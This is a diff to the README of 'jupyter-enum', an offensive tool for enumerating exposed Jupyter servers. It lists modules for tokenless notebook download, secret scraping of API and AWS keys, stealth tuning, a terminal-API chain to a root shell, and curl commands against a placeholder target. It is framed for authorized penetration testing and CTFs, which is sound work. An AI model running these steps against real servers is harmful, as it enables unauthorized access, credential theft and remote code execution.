@@ -8,7 +8,7 @@
 
 Jupyter instances are increasingly common in AI/ML infrastructure — and frequently left **misconfigured or unauthenticated**. An exposed Jupyter server is a direct path to **remote code execution** via the kernel or terminal API.
 
-`jupyter-enum` automates the full reconnaissance phase against Jupyter Notebook and JupyterLab instances, from version fingerprinting to notebook exfiltration and secret scraping.
+`jupyter-enum` automates the full reconnaissance phase: version fingerprinting → file/notebook exfiltration → session/kernel enumeration → RCE surface detection → credential scraping.
 
 ---
 
@@ -16,20 +16,20 @@ Jupyter instances are increasingly common in AI/ML infrastructure — and freque
 
 | # | Module | Endpoint(s) | What it finds |
 |---|---|---|---|
-| 1 | Access Check | `/api`, `/tree`, `/lab` | Unauthenticated access, version, server headers |
-| 2 | File & Notebook Tree | `/api/contents` | Recursive listing of all notebooks and files |
-| 3 | Notebook Accessibility | `/api/contents/<path>` | Per-notebook auth bypass check |
-| 4 | Active Sessions | `/api/sessions` | Which notebooks are open + kernel IDs |
+| 1 | Access Check | `/api`, `/tree`, `/lab` | Unauth access, version, server headers — **continues even on 401/403** |
+| 2 | File & Notebook Tree | `/api/contents` | Recursive listing, configurable depth |
+| 3 | Notebook Accessibility | `/api/contents/<path>` | Per-notebook auth bypass check (**threaded**) |
+| 4 | Active Sessions | `/api/sessions` | Open notebooks + kernel IDs |
 | 5 | Running Kernels | `/api/kernels` | Live kernels, names, execution state |
-| 6 | Terminal Access | `/api/terminals` | **RCE vector** — spawns a shell via WebSocket |
+| 6 | Terminal Access | `/api/terminals` | **RCE vector** — shell via WebSocket |
 | 7 | Kernel Specs | `/api/kernelspecs` | Language, env names, conda/venv paths |
 | 8 | Config Exposure | `/api/config/*` | Auth settings, allow_origin, server config |
 | 9 | Swagger Docs | `/api/swagger.json` | Full API surface disclosure |
-| 10 | Token Patterns | `/login`, `?token=` URL | Token leakage in HTML body and URL parameters |
+| 10 | Token Patterns | `/login` body, `?token=` URL | Token leakage in HTML and URL params |
 | 11 | Recent Activity | `/api/contents` | Last-modified sort — identifies active notebooks |
-| 12 | Secret Scraper | local `.ipynb` cells | Greps for API keys, passwords, AWS keys, private keys |
-| 13 | Download (tokenless) | `/api/contents/<path>` | Full notebook exfiltration, no token needed on open servers |
-| 14 | JSON Report | local | Full findings report saved to output directory |
+| 12 | Secret Scraper | `.ipynb` cells | API keys, passwords, AWS keys, private keys, shell execs |
+| 13 | Download | `/api/contents/<path>` | Tokenless on open servers, **path traversal protected**, **threaded** |
+| 14 | JSON Report | local | Full findings saved to output dir |
 
 ---
 
@@ -41,25 +41,31 @@ cd jupyter-enum
 pip install -r requirements.txt
 ```
 
-**Python 3.8+ required.**
+Python 3.10+ required.
 
 ---
 
 ## Usage
 
-### One-shot full enumeration (recommended starting point)
+### One-shot full enumeration
 
 ```bash
 python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-all
 ```
 
-### With an auth token
+### Token authentication
 
 ```bash
 python3 jupyter_enum.py -t http://10.10.45.20:8888 --token abc123def456 --check-all
 ```
 
-### Download all notebooks (no token needed on open servers)
+### Password authentication (classic Jupyter login form)
+
+```bash
+python3 jupyter_enum.py -t http://10.10.45.20:8888 --password mypassword --check-all
+```
+
+### Download all notebooks (tokenless on open servers)
 
 ```bash
 python3 jupyter_enum.py -t http://10.10.45.20:8888 --download-all
@@ -71,10 +77,16 @@ python3 jupyter_enum.py -t http://10.10.45.20:8888 --download-all
 python3 jupyter_enum.py -t http://10.10.45.20:8888 --download "research/model_train.ipynb"
 ```
 
-### RCE surface only (terminals + kernels)
+### RCE surface only
 
 ```bash
 python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-terminals --enum-kernels
+```
+
+### Tune for stealth (slower, shallower)
+
+```bash
+python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-all --max-depth 2 --delay 1.5 --threads 2
 ```
 
 ### Route through Burp Suite
@@ -89,48 +101,71 @@ python3 jupyter_enum.py -t http://10.10.45.20:8888 --proxy http://127.0.0.1:8080
 
 ```
   -t, --target           Target URL (e.g. http://10.10.45.20:8888)
-  --token                Auth token  [optional — not needed on open servers]
+  --token                API token  [optional]
+  --password             Password for classic Jupyter login form  [optional]
   --timeout              Request timeout in seconds (default: 10)
   --proxy                HTTP proxy (e.g. http://127.0.0.1:8080)
-  --output-dir           Output directory for downloads and report (default: jupyter_loot)
+  --output-dir           Output directory (default: jupyter_loot)
+  --max-depth            Max directory recursion depth (default: 6)
+  --delay                Delay between downloads in seconds (default: 0.2)
+  --threads              Thread count for parallel ops (default: 10)
   --no-banner            Suppress banner
 
-  --check-all            Run every module in sequence (recommended)
+  --check-all            Run every module in sequence
   --enum-contents        Recursively list all files and notebooks
-  --check-notebooks      Test accessibility of each discovered notebook
+  --check-notebooks      Test accessibility of each notebook (threaded)
   --enum-sessions        List active notebook sessions
   --enum-kernels         List running kernels and their state
   --check-terminals      Check terminal (RCE) endpoint
-  --enum-kernelspecs     List available kernel specs (language/env disclosure)
-  --check-config         Check config API endpoints for exposure
-  --check-swagger        Check for swagger/API docs exposure
+  --enum-kernelspecs     List kernel specs (language/env disclosure)
+  --check-config         Check config API endpoints
+  --check-swagger        Check swagger/API docs exposure
   --check-tokens         Check for token leakage in HTML and URL params
   --recent-activity      Sort notebooks by last modified timestamp
-  --download-all         Download all discovered notebooks
+  --download-all         Download all discovered notebooks (threaded)
   --download NB_PATH     Download a specific notebook by path
   --no-scrape            Skip secret scraping on downloaded notebooks
 ```
 
 ---
 
-## Output
+## Output Structure
 
 ```
 jupyter_loot/
 ├── research/
-│   └── model_train.ipynb        ← downloaded, mirrors remote structure
+│   └── model_train.ipynb        ← mirrors remote directory structure
 ├── work/
 │   └── data_pipeline.ipynb
-└── enum_report.json             ← full JSON findings report
+└── enum_report.json             ← full JSON findings + severity ratings
 ```
 
-**enum_report.json** includes: target, version, auth status, counts, all findings with severity ratings, any leaked tokens or scraped secrets, and a timestamp.
+---
+
+## Security Design
+
+Several protections are built into the tool itself — offensive tools run against unknown infrastructure (including honeypots) need defensive programming too.
+
+**Path Traversal / Zip Slip Protection**
+A malicious server can return notebook paths like `../../../../home/user/.ssh/authorized_keys` to overwrite files on your machine. Every download path is resolved and validated to ensure it falls strictly within `--output-dir` before any file is written. Traversal attempts are logged as findings.
+
+**Narrow Exception Handling**
+JSON parse errors catch only `JSONDecodeError`/`ValueError`. Network errors catch only `requests.RequestException`. Standard Python errors (e.g. `TypeError` from bad arguments) bubble up normally so bugs surface immediately rather than being swallowed silently.
+
+**Partial Auth Resilience**
+The tool continues header inspection and login-page token scraping even when `/api` returns 401/403 — some hardened setups still leak version info in headers, and the login page may contain an embedded token.
+
+**Pre-compiled Regex**
+Secret scraping patterns are compiled once at class definition, not per-cell. On notebooks with many cells, this is meaningfully faster.
+
+**Threaded Parallel Execution**
+Notebook accessibility checks and bulk downloads use `ThreadPoolExecutor`. Sequential scanning of 200+ notebooks is avoided by default.
 
 ---
 
 ## The RCE Chain (Terminal API)
 
-If `/api/terminals` is accessible, the path to shell is:
+If `/api/terminals` is accessible:
 
 ```
 1. POST /api/terminals
@@ -143,23 +178,20 @@ If `/api/terminals` is accessible, the path to shell is:
    Recv:  ["stdout", "uid=0(root) gid=0(root) groups=0(root)\n"]
 ```
 
-`jupyter-enum` detects and flags this — execution is left to the operator.
+`jupyter-enum` detects and flags this. Execution is left to the operator.
 
 ---
 
 ## Jupyter API Quick Reference
 
 ```bash
-# Server version
+# Version
 curl http://TARGET:8888/api
 
-# List all files (root)
+# File tree
 curl http://TARGET:8888/api/contents
 
-# List specific directory
-curl http://TARGET:8888/api/contents/work
-
-# Download notebook content
+# Specific notebook content
 curl http://TARGET:8888/api/contents/work/model.ipynb
 
 # Active sessions
@@ -174,26 +206,15 @@ curl http://TARGET:8888/api/terminals
 # Kernel specs
 curl http://TARGET:8888/api/kernelspecs
 
-# With token
+# Authenticated
 curl -H "Authorization: token <TOKEN>" http://TARGET:8888/api/contents
 ```
 
 ---
 
-## Why Jupyter is a High-Value Target
-
-- Commonly deployed in internal AI/ML infra with auth **disabled by default** in older versions
-- Notebooks routinely contain **hardcoded API keys, database credentials, and cloud tokens**
-- Running kernels provide **live arbitrary code execution**
-- The terminal API (`/api/terminals`) is a **direct shell** if reachable
-- Often runs as root in Docker containers or on cloud VMs
-- Frequently appears in CTF machines — HackTheBox, TryHackMe, etc.
-
----
-
 ## Legal Disclaimer
 
-This tool is intended **solely for use in authorized penetration testing engagements, CTF competitions, and controlled lab environments**. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide. The author accepts no liability for misuse.
+This tool is intended **solely for authorized penetration testing engagements, CTF competitions, and controlled lab environments**. Unauthorized access to computer systems is illegal. The author accepts no liability for misuse.
 
 ---
 
